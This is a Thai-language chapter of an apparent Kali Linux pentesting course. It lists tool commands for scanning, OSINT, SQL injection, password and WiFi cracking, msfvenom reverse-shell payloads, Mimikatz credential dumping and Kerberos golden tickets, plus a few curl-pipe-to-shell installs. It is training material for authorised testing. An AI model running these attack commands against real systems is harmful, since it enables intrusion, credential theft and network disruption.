# Part 06: Kali Linux Tools Overview - Overview เครื่องมือทั้งหมด

## สารบัญ
- [หมวด Information Gathering](#information-gathering)
- [หมวด Vulnerability Analysis](#vulnerability-analysis)
- [หมวด Web Application](#web-application)
- [หมวด Password Attacks](#password-attacks)
- [หมวด Wireless Attacks](#wireless-attacks)
- [หมวด Exploitation Tools](#exploitation-tools)
- [หมวด Post-Exploitation](#post-exploitation)
- [หมวด Forensics](#forensics)
- [เครื่องมือที่ต้องรู้จักก่อน](#เครื่องมือที่ต้องรู้จักก่อน)

---

## Information Gathering

### Network Scanners

```bash
# Nmap - King of port scanners
nmap -sV -sC -O 192.168.1.100
nmap -p- --min-rate 5000 192.168.1.100
nmap -A -T4 192.168.1.100

# Masscan - เร็วมาก (millions of packets/sec)
masscan -p0-65535 192.168.1.0/24 --rate=10000
masscan -p80,443,8080 10.0.0.0/8 --rate=100000

# netdiscover - ARP scanning
netdiscover -r 192.168.1.0/24
netdiscover -i eth0 -r 192.168.1.0/24

# arp-scan
arp-scan -l
arp-scan --interface=eth0 --localnet
```

### OSINT Tools

```bash
# theHarvester - email/subdomain gathering
theHarvester -d target.com -b all -f output.html
theHarvester -d target.com -b google,bing,linkedin

# Maltego - visual OSINT (GUI)
maltego

# Recon-ng - web recon framework
recon-ng
# > marketplace install all
# > modules search

# Shodan (requires API key)
shodan search --limit 100 "apache"
shodan host 192.168.1.100

# FOCA - document metadata
# (Windows-based but can run in Wine)

# spiderfoot
spiderfoot -s target.com
spiderfoot -l 0.0.0.0:5001  # Web interface
```

### DNS Tools

```bash
# dnsenum
dnsenum --enum target.com
dnsenum --dnsserver 8.8.8.8 -f /usr/share/wordlists/dnsmap.txt target.com

# fierce
fierce --domain target.com
fierce --domain target.com --subdomains /usr/share/wordlists/fierce/hosts.txt

# dnsrecon
dnsrecon -d target.com -t std
dnsrecon -d target.com -t brt -D /usr/share/wordlists/dnsmap.txt
dnsrecon -d target.com -t axfr

# amass (comprehensive)
amass enum -d target.com
amass enum -d target.com -passive
amass intel -d target.com
```

---

## Vulnerability Analysis

### Vulnerability Scanners

```bash
# Nikto - web server scanner
nikto -h http://target.com
nikto -h target.com -p 80,443,8080
nikto -h target.com -output nikto_report.html

# OpenVAS / Greenbone
gvm-setup
gvm-start
# Access at https://127.0.0.1:9392

# Nmap NSE scripts
nmap --script vuln 192.168.1.100
nmap --script "vuln and safe" 192.168.1.100
nmap --script smb-vuln-ms17-010 -p 445 192.168.1.100
nmap --script http-vuln-cve2017-5638 -p 80 192.168.1.100

# searchsploit - exploit database
searchsploit apache 2.4
searchsploit --id vsftpd 2.3.4
searchsploit -x 1337  # view exploit
searchsploit -m 1337  # copy to current dir
```

---

## Web Application

### Web Scanners

```bash
# Burp Suite (GUI)
burpsuite

# OWASP ZAP
zap-proxy
zap.sh

# w3af
w3af_console
w3af_gui

# gobuster - directory/subdomain brute force
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt

# feroxbuster - recursive content discovery
feroxbuster -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt

# ffuf - fuzzer
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
ffuf -u http://target.com/index.php?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
```

### SQL Injection

```bash
# sqlmap
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D mydb --tables
sqlmap -u "http://target.com/page?id=1" -D mydb -T users --dump
sqlmap -u "http://target.com/page?id=1" --os-shell  # shell!
sqlmap -r request.txt --dbs  # from Burp request file

# havij (Windows)
# SQLNinja
```

---

## Password Attacks

### Offline Crackers

```bash
# Hashcat
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt        # MD5
hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt      # SHA1
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt     # NTLM
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt     # SHA-512crypt
hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John the Ripper
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hash.txt --format=NT
john --show hash.txt

# hash-identifier
hash-identifier  # identify hash type
hashid "5d41402abc4b2a76b9719d911017c592"
```

### Online Attackers

```bash
# Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form '/login:user=^USER^&pass=^PASS^:Wrong'
hydra -L users.txt -P passwords.txt 192.168.1.100 ftp
hydra -l admin -P passwords.txt rdp://192.168.1.100

# Medusa
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M http

# Ncrack
ncrack -p 22 --user admin -P passwords.txt 192.168.1.100
```

### Wordlist Tools

```bash
# CeWL - custom wordlist from website
cewl http://target.com -w wordlist.txt
cewl http://target.com -d 3 -m 6 -w wordlist.txt  # depth=3, min_length=6

# crunch - generate wordlists
crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt
crunch 8 12 abc123 -t @@@@@@@@  # @ = lowercase

# rsmangler
# mentalist

# Wordlists location
ls /usr/share/wordlists/
# rockyou.txt.gz - 14M passwords
# /usr/share/seclists/ - comprehensive lists
```

---

## Wireless Attacks

```bash
# aircrack-ng suite
airmon-ng start wlan0          # Enable monitor mode
airodump-ng wlan0mon           # Capture packets
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon  # Target specific AP
aireplay-ng -0 10 -a AP_MAC -c CLIENT_MAC wlan0mon  # Deauth
aircrack-ng -w rockyou.txt -b AP_MAC capture-01.cap  # Crack

# Wifite - automated attacks
wifite
wifite --crack --dict /usr/share/wordlists/rockyou.txt

# Reaver - WPS attacks
reaver -i wlan0mon -b AP_MAC -v
reaver -i wlan0mon -b AP_MAC -S -v  # small DH keys

# hashcat WPA2
hashcat -m 22000 capture.hccapx rockyou.txt  # WPA2

# WiFi-Pumpkin - evil twin
# hostapd-wpe - rogue AP
```

---

## Exploitation Tools

```bash
# Metasploit Framework
msfconsole
msfdb init  # initialize database
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe -o payload.exe

# Searchsploit
searchsploit vsftpd 2.3.4
searchsploit -x unix/remote/17491.rb

# ExploitDB
# https://exploit-db.com

# msfvenom payloads
msfvenom -l payloads | grep windows
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > shell.php
```

### Web Exploitation

```bash
# BeEF - Browser Exploitation Framework
beef-xss
# Access: http://127.0.0.1:3000/ui/panel
# Username: beef / Password: beef

# XSSer
xsser --url 'http://target.com/search?q=' -p 'q=XSS'

# commix - command injection
commix --url="http://target.com/ping.php?ip=127.0.0.1"
```

---

## Post-Exploitation

```bash
# Meterpreter (inside Metasploit)
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getsystem
meterpreter > hashdump
meterpreter > run post/multi/recon/local_exploit_suggester

# Mimikatz (Windows credential dumping)
lsadump::sam
lsadump::lsa /patch
sekurlsa::logonpasswords
kerberos::list
kerberos::golden /user:Admin /domain:domain.local /sid:S-1-5-21... /krbtgt:hash /id:500

# BloodHound - AD mapping
# Install neo4j
sudo apt install neo4j
neo4j start
bloodhound  # GUI

# SharpHound collector
SharpHound.exe -c All
python3 bloodhound.py -u user -p password -d domain.local -dc dc.domain.local -c All

# PowerShell Empire
# Covenant C2
# Cobalt Strike
```

### Privilege Escalation

```bash
# LinPEAS - Linux PrivEsc Awesome Script
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# หรือ upload ไป target แล้วรัน

# WinPEAS - Windows PrivEsc
# upload WinPEAS.exe ไป target
.\WinPEAS.exe

# Linux Exploit Suggester
./linux-exploit-suggester.sh

# Windows Exploit Suggester
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo systeminfo.txt
```

---

## Forensics

```bash
# Autopsy - GUI forensics
autopsy

# Volatility - memory analysis
volatility -f memory.raw imageinfo
volatility -f memory.raw --profile=Win7SP1x64 pslist
volatility -f memory.raw --profile=Win7SP1x64 hashdump

# Binwalk - firmware analysis
binwalk firmware.bin
binwalk -e firmware.bin  # extract

# Foremost - file carving
foremost -t all -i disk.img

# scalpel - file carving
scalpel disk.img -o output/

# strings
strings suspicious.exe | grep -i password
strings suspicious.exe | grep -i http

# file - identify file type
file suspicious.bin
file -b suspicious.bin

# hexdump
hexdump -C suspicious.bin | head -20
xxd suspicious.bin | head -20

# Wireshark - traffic analysis
wireshark capture.pcap

# NetworkMiner (Windows-based, can use on Linux via Mono)
```

---

## เครื่องมือที่ต้องรู้จักก่อน

### Top 10 Tools สำหรับผู้เริ่มต้น

```
1. Nmap    - Network scanning (ต้องรู้ก่อน!)
2. Metasploit - Exploitation framework
3. Burp Suite - Web app testing
4. Hydra   - Password attacks
5. Wireshark - Packet analysis
6. sqlmap  - SQL injection
7. Nikto   - Web server scanning
8. John    - Password cracking
9. aircrack-ng - Wireless attacks
10. netcat - Swiss army knife
```

### ติดตั้ง Tools เพิ่มเติม

```bash
# seclists - wordlists collection
sudo apt install seclists
ls /usr/share/seclists/

# impacket - Windows protocol tools
pip3 install impacket
# หรือ
sudo apt install python3-impacket

# crackmapexec
sudo apt install crackmapexec
cme smb 192.168.1.0/24

# evil-winrm
gem install evil-winrm
evil-winrm -i 192.168.1.100 -u Administrator -p password

# gobuster
sudo apt install gobuster

# ffuf
sudo apt install ffuf

# feroxbuster
curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh | bash
```

---

## Tools Reference Table

| Tool | Category | Command | Difficulty |
|------|----------|---------|------------|
| nmap | Scanning | `nmap -sV target` | Beginner |
| masscan | Scanning | `masscan -p- target` | Beginner |
| nikto | Web Scan | `nikto -h target` | Beginner |
| burpsuite | Web Proxy | `burpsuite` | Intermediate |
| sqlmap | SQLi | `sqlmap -u url --dbs` | Beginner |
| gobuster | Dir Enum | `gobuster dir -u url -w wordlist` | Beginner |
| metasploit | Exploit | `msfconsole` | Intermediate |
| hashcat | Cracking | `hashcat -m 0 hash wordlist` | Beginner |
| hydra | Online Attack | `hydra -l user -P list target ssh` | Beginner |
| aircrack-ng | Wireless | `aircrack-ng -w list capture.cap` | Intermediate |
| wireshark | Analysis | `wireshark` | Intermediate |
| mimikatz | Post-Exploit | `sekurlsa::logonpasswords` | Advanced |
| bloodhound | AD Mapping | `bloodhound` | Advanced |
| crackmapexec | AD/Network | `cme smb target -u user -p pass` | Intermediate |

---

## สรุป

Kali Linux มีเครื่องมือ 600+ แต่ที่ใช้บ่อยในการ pentest จริงๆ มีประมาณ 20-30 ตัว
เน้นเรียนเครื่องมือหลักๆ ก่อนแล้วค่อยขยายไปเรื่อยๆ

**Part ถัดไป:** [Part 07: Virtual Lab Setup](Part-07-Virtual-Lab-Setup.md)

---
*Part 06/100 | Kali Linux Course*
